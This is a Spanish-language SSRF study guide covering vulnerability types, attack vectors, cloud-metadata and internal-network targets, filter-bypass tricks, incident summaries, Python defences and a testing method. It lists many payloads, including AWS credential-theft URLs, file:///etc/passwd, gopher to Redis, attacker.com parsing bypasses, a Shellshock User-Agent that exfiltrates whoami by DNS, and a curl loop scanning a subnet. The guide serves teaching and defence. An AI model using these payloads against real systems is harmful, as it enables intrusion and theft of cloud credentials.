# Server-side request forgery (SSRF)

## 🔍 ¿Qué es SSRF?

Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante provocar que la aplicación del lado del servidor realice solicitudes HTTP a un dominio arbitrario elegido por el atacante. Esto convierte efectivamente al servidor vulnerable en un proxy, permitiendo a los atacantes:

* Acceder a servicios internos no expuestos a internet
* Evitar controles de acceso de red y firewalls
* Leer datos sensibles de servicios de metadatos en la nube
* Realizar escaneo de puertos de redes internas
* Interactuar con APIs y bases de datos internas
* Potencialmente lograr ejecución remota de código

El problema principal es que la aplicación acepta URLs proporcionadas por el usuario y realiza solicitudes a ellas sin una validación adecuada, confiando en que el usuario no abusará de esta funcionalidad.

***

## 🧩 Tipos de SSRF

### 📡 SSRF Básico (In-Band):

* La respuesta de la solicitud interna se devuelve al atacante
* Visibilidad directa del contenido solicitado
* Ejemplo: verificador de stock que obtiene datos de una API interna

### 🌫️ SSRF Ciego (Out-of-Band):

* No se devuelve una respuesta directa al atacante
* Se deben usar canales laterales para la detección (DNS, timing)
* Más difícil de explotar pero aún peligroso
* Ejemplo: cabecera Referer que provoca logging en el backend

### ⚠️ SSRF Semi-Ciego:

* Respuesta parcial o indicadores indirectos
* Mensajes de error que revelan éxito/fallo
* Diferencias en el tiempo de respuesta
* Ejemplo: errores diferentes para hosts válidos vs inválidos

***

## 🛤️ Vectores comunes de SSRF

### ➡️ Parámetros URL:

```http
GET /product/stock?url=http://internal-api.local/admin
GET /fetch?url=http://169.254.169.254/latest/meta-data/
POST /webhook&callback=http://attacker.com
```

### ➡️ Subida de archivos:

```xml
<!-- SVG con entidad externa -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://internal-api/admin"> ]>
<svg>&xxe;</svg>
```

### ➡️ Generadores de PDF:

```html
<link rel="stylesheet" href="http://internal-api.local/admin">
<img src="http://169.254.169.254/latest/meta-data/">
```

### ➡️ Cabeceras HTTP:

```http
Referer: http://internal-service.local
X-Forwarded-For: http://internal-api
```

### ➡️ Funciones de Import/Export:

* Importación de datos desde URL
* Exportación a webhook URL
* Servicios de conversión de documentos
* Proxy/redimensionado de imágenes

***

## 🎯 Destinos objetivo

### 🏠 Localhost / Servicios internos:

```
http://localhost/admin
http://127.0.0.1/admin
http://127.1/admin
http://0.0.0.0:8080/admin
http://[::1]/admin
```

### 🌐 Red interna:

```
http://192.168.0.1/admin
http://10.0.0.1/admin
http://172.16.0.1/admin
http://internal-api.company.local
```

### ☁️ Metadatos de la nube:

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

### 🔗 Servicios externos:

* Servidores controlados por el atacante para exfiltración de datos
* Endpoints de webhook
* Servidores Collaborator para detección de SSRF ciego

***

## 🚪 Técnicas de bypass de filtros

### 🚫 Bypass de blacklist

➡️ **Representaciones alternativas de IP:**

```
127.0.0.1      → Estándar
127.1          → Notación decimal (acortada)
2130706433     → Representación decimal
0x7f000001     → Hexadecimal
0177.0.0.1     → Octal
127.0.0.1.nip.io → Resolución DNS a localhost
localhost.company.com → Si no está en blacklist
```

➡️ **Protocolos alternativos:**

```
http://localhost
file:///etc/passwd
dict://localhost:6379/
gopher://localhost:6379/
```

➡️ **DNS Rebinding:**

```
1. attacker.com inicialmente resuelve a IP del atacante
2. El servidor valida y permite
3. attacker.com cambia para resolver a 127.0.0.1
4. La solicitud real va a localhost
```

➡️ **Encoding:**

```
admin → %61%64%6d%69%6e
admin → %2561%2564%256d%2569%256e
admin → &#97;&#100;&#109;&#105;&#110;
```

### 🧩 Bypass de whitelist

➡️ **Confusión en parsing de URL:**

```
# Intención: solo permitir stock.example.com
http://stock.example.com@attacker.com
http://attacker.com#stock.example.com
http://attacker.com?stock.example.com
http://stock.example.com.attacker.com
http://stockxexample.com
```

➡️ **Credenciales embebidas:**

```
http://expected-domain@internal-server
http://expected-domain:expected-domain@127.0.0.1
```

➡️ **Open Redirect chaining:**

```
http://allowed-domain/redirect?url=http://internal-service
```

➡️ **Fragmentos de URL:**

```
http://allowed-domain#@attacker.com
```

***

## ⚔️ Escenarios de explotación

### 👑 Acceso a panel de admin:

```
1. Encontrar vulnerabilidad SSRF
2. Apuntar a http://localhost/admin
3. Descubrir funcionalidad de admin
4. Construir solicitud para realizar acciones de admin
5. Ejemplo: /admin/delete?username=victim
```

### ☁️ Robo de metadatos en la nube:

```
# AWS - Obtener credenciales IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

Respuesta:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJa...",
  "Token": "IQoJ..."
}
```

### 📡 Escaneo de puertos interno:

```
http://internal-host:22
http://internal-host:80
http://internal-host:3306
http://internal-host:6379
```

### 🔌 Interacción con API interna:

```http
POST http://internal-api/users/create
{
  "username": "attacker",
  "role": "admin"
}
```

### 📂 Acceso al sistema de archivos:

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
```

***

## 🕵️ Detección de SSRF ciego

### 🌐 Detección basada en DNS:

```http
Referer: http://unique-id.burpcollaborator.net
```

### ⏱️ Detección basada en tiempo:

```
http://192.168.255.255
```

### ❌ Detección basada en errores:

```
"Connection refused" → Puerto cerrado
"No route to host" → La IP no existe
"Timeout" → Firewall bloqueando
"Invalid response" → El servicio respondió
```

### 📤 Exfiltración Out-of-Band:

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).attacker.com
```

**Resultado:**

```
peter.attacker.com
```

***

## 💥 Impacto en el mundo real

### Capital One (2019):

* SSRF al servicio de metadatos de AWS
* Extracción de credenciales IAM
* Acceso a buckets S3
* Más de 100 millones de registros robados

### Uber (2016):

* SSRF en herramientas internas
* Acceso a servicios internos
* Exfiltración de datos

### Google Cloud (2020):

* SSRF en Cloud Shell
* Acceso al servicio de metadatos
* Escalada de privilegios

### Bug Bounties:

* Acceso a paneles de admin internos
* Robo de credenciales de bases de datos
* Abuso de APIs internas
* Toma de control de cuentas cloud

***

## 🛡️ Estrategias de defensa

### ✅ Validación de entrada:

```python
ALLOWED_HOSTS = ['api.trusted-partner.com', 'cdn.example.com']

def is_allowed_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_HOSTS
```

```python
BLOCKED_RANGES = ['127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']

def is_internal_ip(ip):
    for blocked in BLOCKED_RANGES:
        if ipaddress.ip_address(ip) in ipaddress.ip_network(blocked):
            return True
    return False
```

### 📐 Parsing de URL:

```python
parsed_url = urlparse(user_url)

if parsed_url.scheme not in ['http', 'https']:
    raise ValueError("Esquema inválido")

ip = socket.gethostbyname(parsed_url.hostname)

if is_internal_ip(ip):
    raise ValueError("IP interna bloqueada")
```

### 🧱 Segmentación de red:

* Servidores en red aislada
* Sin acceso directo a servicios internos
* Uso de API gateway
* Firewall bloqueando rangos internos

### 📜 Protocolos permitidos:

```python
allowed_schemes = ['http', 'https']
if parsed_url.scheme not in allowed_schemes:
    raise ValueError("Protocolo no permitido")
```

### 📋 Uso de whitelist:

```python
if hostname not in TRUSTED_PARTNERS:
    deny()
```

### 🧹 Manejo de respuestas:

```python
response = make_request(url)
data = extract_specific_fields(response)
return sanitized_data
```

***

## 📋 Metodología de testing

### 🔎 Descubrimiento:

* Encontrar todos los parámetros URL
* Identificar funcionalidades webhook/callback
* Buscar funcionalidades import/fetch
* Comprobar subida de archivos (SVG, XML, HTML)
* Probar cabeceras HTTP

### 🔥 Explotación:

```
http://localhost
http://127.0.0.1
http://[::1]
```

```
http://169.254.169.254/latest/meta-data/
```

```
http://192.168.0.1
http://10.0.0.1
```

```
http://burpcollaborator.net
```

### 🧪 Bypass de filtros:

```
1. Formatos IP alternativos
2. DNS → IP interna
3. URL encoding
4. Open redirect
5. Confusión de parsing
```

### 🤖 Automatización:

```
- ssrfmap
- SSRFire
- Gopherus
- Scripts personalizados
```

```bash
for i in {1..255}; do
  curl "http://vuln-app/fetch?url=http://192.168.0.$i:80"
done
```
